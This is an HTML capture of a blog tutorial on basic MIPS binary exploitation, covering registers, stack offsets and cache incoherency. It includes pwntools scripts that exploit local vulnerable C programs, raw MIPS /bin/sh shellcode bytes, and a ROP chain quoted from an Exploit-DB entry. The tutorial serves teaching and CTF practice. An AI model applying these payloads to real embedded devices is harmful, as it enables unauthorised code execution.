+&lt;p&gt;The first gadget is for setting up the arguments needed to use &lt;code&gt;sleep()&lt;/code&gt;. The use of &lt;code&gt;zero&lt;/code&gt; instead of &lt;code&gt;0&lt;/code&gt; to initialize a register to zero is another characteristic feature of MIPS!&lt;/p&gt;
+&lt;p&gt;The second gadget is a stack-cleaning gadget, which can be easily found in functions like &lt;code&gt;__libc_csu_init&lt;/code&gt;, as introduced in our earlier exercise.&lt;/p&gt;
+&lt;p&gt;Finally, you can see how a ROP chain is constructed along with a function call gadget.&lt;/p&gt;
+&lt;p&gt;Finally, for those who find it a bit difficult to practice in a MIPS environment and want to study with CTF problems, you can refer to the challenges below!&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;Hack.lu 2019 - no_risc_no_future&lt;/strong&gt;&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;HackCTF - BabyMIPS&lt;/strong&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;RISC architectures like MIPS are unfamiliar at first, but once you get used to the exploitation tips and tricks specific to the architecture&amp;#x2019;s characteristics, they seem quite manageable! I hope this has been of some help to those who are new to MIPS exploitation!&lt;/p&gt;
+&lt;p&gt;I&amp;#x2019;ll be back with another embedded topic next time! Thank you! &amp;#x1F44B;&amp;#x1F3FB;&lt;/p&gt;
+ - hack &amp; life">
+  <meta property="og:image" content="https://hackyboiz.github.io/2025/08/21/newp1ayer48/mips/ko/image1.jpg">
+  <meta property="og:url" content="https://hackyboiz.github.io/">
+
+  <link rel="canonical" href="https://hackyboiz.github.io/2025/08/21/newp1ayer48/mips/en/">
+
+  <title>[Research] Exploitation basic in MIPS (EN) - hackyboiz</title>
+
+  <link rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css">
+
+
+  <link rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/4.0.0/github-markdown.min.css">
+  <link rel="stylesheet" href="/lib/hint/hint.min.css">
+
+  
+    
+    <link rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.0.0/styles/github-gist.min.css">
+  
+
+  
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_6peoq002giu.css">
+<link rel="stylesheet" href="/.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_pjno9b9zyxs.css">
+<link rel="stylesheet" href="/.css">
+
+
+<link rel="stylesheet" href="/css/main.css">
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script src="/js/utils.js"></script>
+  <script src="/js/color-schema.js"></script>
+
+<meta name="generator" content="Hexo 5.1.1"><link rel="alternate" href="/rss2.xml" title="hackyboiz" type="application/rss+xml">
+</head>
+
+
+<body>
+  <header style="height: 40vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">&nbsp;<strong>Hackyboiz</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                Home
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                Archives
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                Categories
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                Tags
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-addrcard"></i>
+                About
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/author/">
+                <i class="iconfont icon-user-fill"></i>
+                Author
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" href="javascript:">&nbsp;<i class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner intro-2" id="background" parallax="true" style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="container page-header text-center fade-in-up">
+            <span class="h2" id="subtitle">
+              
+            </span>
+
+            
+              
+  <div class="mt-3 post-meta">
+    <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+    <time datetime="2025-08-21 19:00" pubdate>
+      2025년 8월 21일 오후
+    </time>
+  </div>
+
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      2k 자
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      39
+       분
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2">
+      <!--<script data-ad-client="ca-pub-3672652207808168" async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>-->
+    </div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="container nopadding-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto" id="post">
+            <!-- SEO header -->
+            <h1 style="display: none">[Research] Exploitation basic in MIPS (EN)</h1>
+                       
+            <div class="markdown-body" id="post-body">
+              <!-- <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>-->
+              <!-- hackyboiz_horizen_index -->
+              <!--
+              <ins class="adsbygoogle"
+                   style="display:block"
+                   data-ad-client="ca-pub-3672652207808168"
+                   data-ad-slot="8887862313"
+                   data-ad-format="auto"
+                   data-full-width-responsive="true"></ins>
+              <script>
+                   (adsbygoogle = window.adsbygoogle || []).push({});
+              </script>
+              -->
+              <p>Hello! I&#x2019;m newp1ayer48, the one in charge of the low-level at Hackyboiz! &#x1F938;&#x1F3FB;&#x200D;&#x2642;&#xFE0F;</p>
+<p><img src="image1.jpg" srcset="/img/loading.gif" alt="image1.jpg"></p>
+<p>When you get into embedded hacking, you encounter binaries and environments from various RISC architectures.</p>
+<p>Most of the time, you&#x2019;ll work with and see the ARM architecture. However, it&#x2019;s also not uncommon to come across MIPS and MIPSEL architectures&#x2026;</p>
+<p>The assembly instructions and registers look unfamiliar from the start, and to top it off, you have to worry about the Cache&#x2026;</p>
+<p>Let&#x2019;s cover the most fundamental aspects needed for exploitation in this somewhat alien MIPS environment!</p>
+<h2 id="1-MIPS-vs-MIPSEL"><a href="#1-MIPS-vs-MIPSEL" class="headerlink" title="1. MIPS vs MIPSEL"></a>1. MIPS vs MIPSEL</h2><p><img src="image2.jpg" srcset="/img/loading.gif" alt="image2.jpg"></p>
+<p>MIPS is one of the RISC architectures designed so that registers and instructions perform a single role. Although it has the disadvantage of having many registers, its instructions are simple, leading to low power consumption, which is why it&#x2019;s primarily used in embedded devices.</p>
+<p>Because the MIPS instruction set is so cleanly organized, it&#x2019;s often the architecture taught in university computer architecture courses (that was the case for me)&#x2026;</p>
+<p>MIPS is big-endian, while MIPSEL is little-endian. MIPSEL only adopts the little-endian data storage format, so it operates in the same way as MIPS. Since the commonly used x86-64 architecture also uses this data storage method, you can use pwntools functions in the same way for MIPSEL. Therefore, in a MIPSEL environment, you can use pwntools&#x2019; <code>p32()</code> and <code>p64()</code> functions as they are!</p>
+<h2 id="2-MIPS-Stack-amp-Register"><a href="#2-MIPS-Stack-amp-Register" class="headerlink" title="2. MIPS Stack &amp; Register"></a>2. MIPS Stack &amp; Register</h2><p>Before we dive into exploitation, it&#x2019;s necessary to understand the stack structure and behavior in a MIPS environment.</p>
+<p>The official references for the MIPS architecture are <a target="_blank" rel="external nofollow noopener noreferrer" href="https://www.cs.cornell.edu/courses/cs3410/2008fa/MIPS_Vol1.pdf">MIPS32 Architecture For Programmers Volume I</a> and the <a target="_blank" rel="external nofollow noopener noreferrer" href="https://www.cs.unibo.it/~solmi/teaching/arch_2002-2003/AssemblyLanguageProgDoc.pdf">MIPS Assembly Language Programmer&#x2019;s Guide</a>.</p>
+<p>From these, let&#x2019;s cover the knowledge we need from an exploitation perspective. First, here is a list of registers used in MIPS and their roles.</p>
+<div class="table-container">
+<table>
+<thead>
+<tr>
+<th>&#xC774;&#xB984;</th>
+<th>&#xB808;&#xC9C0;&#xC2A4;&#xD130; &#xBC88;&#xD638;</th>
+<th>&#xC5ED;&#xD560;</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong><code>$zero</code></strong></td>
+<td><strong><code>$0</code></strong></td>
+<td>Always returns 0</td>
+</tr>
+<tr>
+<td><strong><code>$at</code></strong></td>
+<td><strong><code>$1</code></strong></td>
+<td>Reserved for assembler to calculate pseudo-instructions</td>
+</tr>
+<tr>
+<td><strong><code>$v0</code> ~ <code>$v1</code></strong></td>
+<td><strong><code>$2</code> ~ <code>$3</code></strong></td>
+<td>Stores values returned from functions</td>
+</tr>
+<tr>
+<td><strong><code>$a0</code> ~ <code>$a3</code></strong></td>
+<td><strong><code>$4</code> ~ <code>$7</code></strong></td>
+<td>Stores function arguments</td>
+</tr>
+<tr>
+<td><strong><code>$t0</code> ~ <code>$t7</code></strong></td>
+<td><strong><code>$8</code> ~ <code>$15</code></strong></td>
+<td>Used for temporary value storage by the assembler or language</td>
+</tr>
+<tr>
+<td><strong><code>$s0</code> ~ <code>$s7</code></strong></td>
+<td><strong><code>$16</code> ~ <code>$23</code></strong></td>
+<td>Used to store long-lasting values (callee-saved)</td>
+</tr>
+<tr>
+<td><strong><code>$t8</code> ~ <code>$t9</code></strong></td>
+<td><strong><code>$24</code> ~ <code>$25</code></strong></td>
+<td>Used for temporary value storage by the assembler or language</td>
+</tr>
+<tr>
+<td><strong><code>$k0</code> ~ <code>$k1</code></strong></td>
+<td><strong><code>$26</code> ~ <code>$27</code></strong></td>
+<td>Reserved for the OS kernel</td>
+</tr>
+<tr>
+<td><strong><code>$gp</code></strong></td>
+<td><strong><code>$28</code></strong></td>
+<td>Stores the value of the global pointer</td>
+</tr>
+<tr>
+<td><strong><code>$sp</code></strong></td>
+<td><strong><code>$29</code></strong></td>
+<td>Stores the value of the stack pointer</td>
+</tr>
+<tr>
+<td><strong><code>$fp</code>/<code>$s8</code></strong></td>
+<td><strong><code>$30</code></strong></td>
+<td>Stores the value of the frame pointer</td>
+</tr>
+<tr>
+<td><strong><code>$ra</code></strong></td>
+<td><strong><code>$31</code></strong></td>
+<td>Stores the return address</td>
+</tr>
+</tbody>
+</table>
+</div>
+<p>The registers to pay close attention to are <code>$ra</code>, <code>$sp</code>, and <code>$s8</code>.</p>
+<p>In MIPS, the <code>$ra</code> register holds the function&#x2019;s return address. It&#x2019;s helpful to think of it as serving the role of <code>RET</code> in x86/x64.</p>
+<pre><code class="hljs nasm">0x00400734 &lt;main+0&gt;:    addiu   sp,sp,-136
+0x00400738 &lt;main+4&gt;:    sw      ra,132(sp)
+0x0040073c &lt;main+8&gt;:    sw      s8,128(sp)
+0x00400740 &lt;main+12&gt;:   move    s8,sp
+...
+0x004007d8 &lt;main+164&gt;:  move    sp,s8
+0x004007dc &lt;main+168&gt;:  lw      ra,132(sp)
+0x004007e0 &lt;main+172&gt;:  lw      s8,128(sp)
+0x004007e4 &lt;main+176&gt;:  addiu   sp,sp,136
+0x004007e8 &lt;main+180&gt;:  jr      ra</code></pre>
+<p>The structure works by saving the return address from the <code>$ra</code> register onto the stack during the function prologue and then jumping to the return address in the <code>$ra</code> register during the function epilogue.</p>
+<p>The <code>$ra</code> register&#x2019;s value is saved to the stack relative to the <code>$sp</code> (current stack pointer) and <code>$s8</code> (frame pointer). Therefore, the first step in stack-based exploitation is to calculate the offset by determining the buffer&#x2019;s starting position and the return address&#x2019;s location relative to the <code>$sp</code> register.</p>
+<pre><code class="hljs nasm">lw      $s2, 24(sp)      ; Load value at sp+24 into $s2 (address of &amp;&quot;/bin/sh&quot;)
+lw      $s1, 20(sp)      ; Load value at sp+20 into $s1 (address of &amp;system)
+lw      $s0, 16(sp)      ; Load value at sp+16 into $s0 (address of &amp;sleep)
+lw      $ra, 28(sp)      ; Load value at sp+28 into $ra (address of the next gadget)
+addiu   sp, sp, 32       ; Clean up the stack pointer
+jr      $ra              ; Jump to $ra (the next gadget)</code></pre>
+<p>The gadget form needed for the Shellcode and ROP chains, which will be explained later, is shown above.</p>
+<p>The most basic form involves loading values from the stack into the <code>$s0-$s7</code> registers using the <code>lw</code> instruction, cleaning up the stack pointer with <code>addiu</code>, and then jumping to the return address with <code>jr</code>.</p>
+<p>Since this is the most basic form, you can combine the necessary arguments and instructions to fit the specific situation and environment.</p>
+<pre><code class="hljs nasm">move    $t9, $s1         ; Move $s1 (system address) to $t9 (register for calls)
+jalr    $t9              ; Jump to the address in $t9</code></pre>
+<p>Function execution is performed via the <code>jalr</code> instruction. You can understand it as working like the call instruction in x86-64.</p>
+<h2 id="3-Cache-Incoherency"><a href="#3-Cache-Incoherency" class="headerlink" title="3. Cache Incoherency"></a>3. Cache Incoherency</h2><p>When exploiting a real device configured with a MIPS environment, you&#x2019;ll sometimes need to use shellcode due to the nature of IoT/embedded devices. However, there&#x2019;s a crucial point to be aware of when using shellcode in a MIPS environment.</p>
+<p>That is the Cache.</p>
+<p><img src="image3.png" srcset="/img/loading.gif" alt="image3.png"></p>
+<p>MIPS uses two types of caches: the Instruction Cache, which holds opcodes, and the Data Cache, which records data.</p>
+<p>The problem, known as Cache Incoherency, occurs because the value we input (our shellcode) goes into the Data Cache, but the CPU tries to execute instructions from the existing Instruction Cache.</p>
+<p>To solve this, we need to bring the data from the Data Cache to the Instruction Cache. This process, depending on the cache write policy, involves synchronizing with memory and then invalidating the Instruction Cache. The important part here is that we need to flush the Data Cache to force a cache write.</p>
+<p><img src="image4.png" srcset="/img/loading.gif" alt="image4.png"></p>
+<p>The state of memory and the caches after the Data Cache has been flushed is shown above. Since the instructions in the Instruction Cache and memory are no longer identical, the Instruction Cache is invalidated. Then, the code from the Data Cache, now synchronized with memory, is executed.</p>
+<p>Only by going through this process can we create a flow where the shellcode we&#x2019;ve inserted can actually be executed.</p>
+<p><img src="image5.png" srcset="/img/loading.gif" alt="image5.png"></p>
+<p>The easiest way to achieve this is by calling the <code>sleep()</code> function.</p>
+<p>When <code>sleep()</code> is called, execution is passed to another process or thread, causing other data to be generated in the Data Cache. Later, according to the cache write policy, a flush occurs, and the data residing in memory is also written to the Data Cache.</p>
+<p>Therefore, if you&#x2019;re using shellcode in a MIPS environment, it&#x2019;s a good practice to structure your exploit by calling <code>sleep()</code>.</p>
+<h2 id="4-MIPS-Exploit-Practice"><a href="#4-MIPS-Exploit-Practice" class="headerlink" title="4. MIPS Exploit Practice"></a>4. MIPS Exploit Practice</h2><p>Let&#x2019;s practice exploitation in a MIPS environment with a simple example.</p>
+<h3 id="4-1-RTL"><a href="#4-1-RTL" class="headerlink" title="4-1: RTL"></a>4-1: RTL</h3><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span>
+
+<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">target</span><span class="hljs-params">()</span></span>
+<span class="hljs-function"></span>{
+        system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);
+}
+
+<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> *argv[])</span></span>
+<span class="hljs-function"></span>{
+        setvbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-literal">NULL</span>, _IONBF, <span class="hljs-number">0</span>);
+
+        <span class="hljs-keyword">char</span> buf[<span class="hljs-number">100</span>];
+        <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%s&quot;</span>, buf);
+        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s\n&quot;</span>, buf);
+        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
+}</code></pre>
+<p>We&#x2019;ll practice finding the stack offset using a basic RTL in a MIPS environment. This example code creates a vulnerable function where a buffer overflow occurs.</p>
+<pre><code class="hljs nasm">0x00400738 &lt;main+4&gt;:    sw      ra,132(sp)  ; ret
+0x0040073c &lt;main+8&gt;:    sw      s8,128(sp)
+0x00400740 &lt;main+12&gt;:	  move	  s8,sp
+...
+0x0040079c &lt;main+104&gt;:	addiu	  v0,s8,24  ; buf
+0x004007a0 &lt;main+108&gt;:	move	  a1,v0
+...
+0x004007b0 &lt;main+124&gt;:	jalr	  t9  ; scanf</code></pre>
+<p>By checking the assembly with gdb, we can find the following offsets:</p>
+<ul>
+<li><p>Return address: sp + 132<br>We can see that the value in the $ra register, which holds the return address, is stored at sp+132.</p>
+</li>
+<li><p>Buffer start: sp + 24<br>We can see that the argument for scanf() involves the operation s8 + 24 (and s8 was set to sp).</p>
+</li>
+</ul>
+<p>Therefore, the offset is 132 - 24 = 108.</p>
+<pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
+
+p = remote(<span class="hljs-string">&quot;localhost&quot;</span>, <span class="hljs-number">3312</span>)
+
+sh = <span class="hljs-number">0x4006e0</span>
+
+pay = <span class="hljs-string">b&quot;A&quot;</span> * <span class="hljs-number">108</span>
+pay += p32(sh)
+
+p.sendline(pay)
+p.interactive()</code></pre>
+<p><img src="image6.png" srcset="/img/loading.gif" alt="image6.png"></p>
+<p>After writing the exploit code with the correct offset and running it, we can confirm that it works perfectly.</p>
+<h3 id="4-2-shellcode"><a href="#4-2-shellcode" class="headerlink" title="4-2: shellcode"></a>4-2: shellcode</h3><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span>
+
+<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>
+<span class="hljs-function"></span>{
+        setvbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-literal">NULL</span>, _IONBF, <span class="hljs-number">0</span>);
+        sleep(<span class="hljs-number">1</span>);
+
+        <span class="hljs-keyword">char</span> buf[<span class="hljs-number">100</span>];
+        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;buf: %p\n&quot;</span>, buf);
+        <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%s&quot;</span>, buf);
+        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s\n&quot;</span>, buf);
+        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
+}</code></pre>
+<p>This is an example of using shellcode while considering the Cache Incoherency issue in MIPS that we discussed earlier. This is also a buffer overflow vulnerable code, built with NX disabled.</p>
+<p>The return address offset is the same as in the previous problem.</p>
+<p><img src="image7.png" srcset="/img/loading.gif" alt="image7.png"></p>
+<p>Additionally, I used an address within <code>__libc_csu_init</code> for the stack-cleaning gadget.</p>
+<pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
+<span class="hljs-keyword">import</span> time
+
+p = remote(<span class="hljs-string">&quot;localhost&quot;</span>, <span class="hljs-number">3312</span>)
+
+sh = <span class="hljs-string">b&quot;\x69\x6e\x02\x3c\x2f\x62\x42\x24\xec\xff\xa2\xaf\x73\x68\x03\x3c\x2f\x2f\x63\x24\xf0\xff\xa3\xaf\xf4\xff\xa0\xaf\xfc\xff\xa0\xaf\xfc\xff\xa6\x27\xec\xff\xa4\x27\xf8\xff\xa4\xaf\xf8\xff\xa5\x27\xab\x0f\x02\x24\x0c\x01\x01\x01&quot;</span>
+
+sleep_addr = <span class="hljs-number">0x00400970</span>
+gadget = <span class="hljs-number">0x00400824</span>
+
+p.recvuntil(<span class="hljs-string">b&quot;buf: &quot;</span>)
+addr = int(p.recv(<span class="hljs-number">10</span>), <span class="hljs-number">16</span>)
+
+log.success(<span class="hljs-string">&quot;addr is {}&quot;</span>.format(hex(addr)))
+
+pay = sh
+pay += <span class="hljs-string">b&quot;A&quot;</span> * (<span class="hljs-number">108</span> - len(sh))
+pay += p32(sleep_addr)
+pay += p32(gadget)
+pay += p32(addr)
+
+time.sleep(<span class="hljs-number">1</span>)
+p.sendline(pay)
+p.interactive()</code></pre>
+<p><img src="image8.png" srcset="/img/loading.gif" alt="image8.png"></p>
+<p>The most basic approach is to call the <code>sleep()</code> function, followed by a stack-cleaning gadget, and then jump to the shellcode address. The shellcode is for MIPS.</p>
+<p>In a real-world scenario, using shellcode would also require a libc base leak and gadget calls to invoke <code>sleep()</code>, which means you would be performing a ROP attack. You can refer to the link below!</p>
+<p><a target="_blank" rel="external nofollow noopener noreferrer" href="https://www.exploit-db.com/exploits/48994">https://www.exploit-db.com/exploits/48994</a></p>
+<pre><code class="hljs python">First ROP (sleep_gadget): <span class="hljs-number">0x0004c974</span> + libc_base = <span class="hljs-number">0x2ab2e974</span>
+<span class="hljs-number">0x0004c97c</span>      move    t9, s0
+<span class="hljs-number">0x0004c980</span>      lw      ra, (var_1ch)
+<span class="hljs-number">0x0004c984</span>      lw      s0, (var_18h)
+<span class="hljs-number">0x0004c988</span>      addiu   a0, zero, <span class="hljs-number">2</span> ; arg1
+<span class="hljs-number">0x0004c98c</span>      addiu   a1, zero, <span class="hljs-number">1</span> ; arg2
+<span class="hljs-number">0x0004c990</span>      move    a2, zero
+<span class="hljs-number">0x0004c994</span>      jr      t9
+
+Second ROP (stack_gadget): <span class="hljs-number">0x00039fa8</span> + libc_base = <span class="hljs-number">0x2ab1bfa8</span>
+<span class="hljs-number">0x00039fa8</span>      addiu   s0, sp, <span class="hljs-number">0x28</span>
+<span class="hljs-number">0x00039fac</span>      move    a0, s3
+<span class="hljs-number">0x00039fb0</span>      move    a1, s0
+<span class="hljs-number">0x00039fb4</span>      move    t9, s1
+<span class="hljs-number">0x00039fb8</span>      jalr    t9
+
+Third ROP (call_gadget): <span class="hljs-number">0x000406d8</span> + libc_base = <span class="hljs-number">0x2ab226d8</span>
+<span class="hljs-number">0x000406d8</span>      move    t9, s0
+<span class="hljs-number">0x000406dc</span>      jalr    t9
+
+payload = <span class="hljs-string">&quot;A&quot;</span>*<span class="hljs-number">160</span> + sleep_addr + call_gadget +  sleep_gadget + junk + stack_gadget + shellcode
+</code></pre>
+<p>Here are the ROP gadgets and payload section used in that link.</p>
+<p>The first gadget is for setting up the arguments needed to use <code>sleep()</code>. The use of <code>zero</code> instead of <code>0</code> to initialize a register to zero is another characteristic feature of MIPS!</p>
+<p>The second gadget is a stack-cleaning gadget, which can be easily found in functions like <code>__libc_csu_init</code>, as introduced in our earlier exercise.</p>
+<p>Finally, you can see how a ROP chain is constructed along with a function call gadget.</p>
+<p>Finally, for those who find it a bit difficult to practice in a MIPS environment and want to study with CTF problems, you can refer to the challenges below!</p>
+<ul>
+<li><strong>Hack.lu 2019 - no_risc_no_future</strong></li>
+<li><strong>HackCTF - BabyMIPS</strong></li>
+</ul>
+<p>RISC architectures like MIPS are unfamiliar at first, but once you get used to the exploitation tips and tricks specific to the architecture&#x2019;s characteristics, they seem quite manageable! I hope this has been of some help to those who are new to MIPS exploitation!</p>
+<p>I&#x2019;ll be back with another embedded topic next time! Thank you! &#x1F44B;&#x1F3FB;</p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                <div class="post-meta mr-3">
+                  <i class="iconfont icon-category"></i>
+                  
+                  <a class="hover-with-bg" href="/categories/Research/">Research</a>
+                  
+                </div>
+                
+                
+                <div class="post-meta">
+                  <i class="iconfont icon-tags"></i>
+                  
+                  <a class="hover-with-bg" href="/tags/newp1ayer48/">newp1ayer48</a>
+                  
+                  <a class="hover-with-bg" href="/tags/Embedded/">Embedded</a>
+                  
+                  <a class="hover-with-bg" href="/tags/MIPS/">MIPS</a>
+                  
+                </div>
+                
+              </div>
+
+              <div class="post-metas mb-3">
+                <a class="hover-with-bg" style="display: flex;" href="/author">
+                  <div class="link-avatar-page">
+                    <img src="/img/profile_newp1ayer48.jpg" srcset="/img/loading.gif" alt="newp1ayer48">
+                  </div>
+
+                  <div class="link-text">
+                    <div class="link-title">newp1ayer48</div>
+                  </div>
+                </a>
+                <div class="link-text">
+                  <div class="link-more">
+                    <a href="/tags/newp1ayer48">
+                      Read more
+                      <i class="iconfont icon-arrowdown"></i>
+                    </a>
+                  </div>
+                </div>
+              </div>
+
+              <hr>
+              <!--<script data-ad-client="ca-pub-3672652207808168" async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>-->
+              
+              <!--  -->
+              <p class="note note-warning">본 글은 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.ko" rel="external nofollow noopener noreferrer">CC BY-SA 4.0</a> 라이선스로 배포됩니다. 공유 또는 변경 시 반드시 출처를 남겨주시기 바랍니다.</p>
+              
+              
+              
+              <div class="post-prevnext row">
+                <article class="post-prev col-6">
+                  
+                  
+                  <a href="/2025/08/23/poosic/cve-2025-2028,1cve-2025-20337/">
+                    <i class="iconfont icon-arrowleft"></i>
+                    <span class="hidden-mobile">[하루한줄] CVE-2025-20281/CVE-2025-20337 : Cisco Identity Services Engine의 원격 코드 실행 취약점</span>
+                    <span class="visible-mobile">Previous</span>
+                  </a>
+                  
+                </article>
+                <article class="post-next col-6">
+                  
+                  
+                  <a href="/2025/08/21/newp1ayer48/mips/ko/">
+                    <span class="hidden-mobile">[Research] Exploitation basic in MIPS (KO)</span>
+                    <span class="visible-mobile">Next</span>
+                    <i class="iconfont icon-arrowright"></i>
+                  </a>
+                  
+                </article>
+              </div>
+              
+            </div>
+            
+            <!-- Embed Section -->
+            <div style="width: 100%; height: 210px; margin-bottom: 50px; overflow: hidden;">
+              <iframe src="https://maily.so/hackyboiz/embed?src=embed" style="width: 100%; height: 100%; border: none;" frameborder="0"></iframe>
+            </div>            
+
+            
+            <!-- Comments -->
+            <article class="comments" id="comments">
+              
+              
+  <div class="disqus" style="width:100%">
+    <div id="disqus_thread"></div>
+    <script type="text/javascript">
+      var disqus_config = function () {
+        this.page.url = 'https://hackyboiz.github.io/2025/08/21/newp1ayer48/mips/en/';
+        this.page.identifier = '/2025/08/21/newp1ayer48/mips/en/';
+      };
+      function loadDisqus() {
+        (function () {
+          var d = document,
+            s = d.createElement('script');
+          s.src = '//' + 'hackyboiz' + '.disqus.com/embed.js';
+          s.setAttribute('data-timestamp', new Date());
+          (d.head || d.body).appendChild(s);
+        })();
+      }
+      waitElementVisible('disqus_thread', loadDisqus);
+    </script>
+    <noscript>Please enable JavaScript to view the
+      <a target="_blank" href="https://disqus.com/?ref_noscript" rel="external nofollow noopener noreferrer">comments powered by Disqus.</a>
+    </noscript>
+  </div>
+
+
+            </article>
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+    <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+      <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;TOC</p>
+  <div id="tocbot"></div>
+</div>
+
+    </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+    
+  </main>
+
+  
+    <a id="scroll-top-button" href="#" role="button">
+      <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+    </a>
+  
+
+  
+    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel" aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+  
+
+  
+
+  
+
+  <footer class="mt-5">
+  <div class="text-center py-3">
+    <div>
+      <a href="https://hexo.io" target="_blank" rel="external nofollow noopener noreferrer"><span>Hexo</span></a>
+      <i class="iconfont icon-love"></i>
+      <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="external nofollow noopener noreferrer">
+        <span>Fluid</span></a>
+    </div>
+    
+
+    
+
+    
+  </div>
+</footer>
+
+<!-- SCRIPTS -->
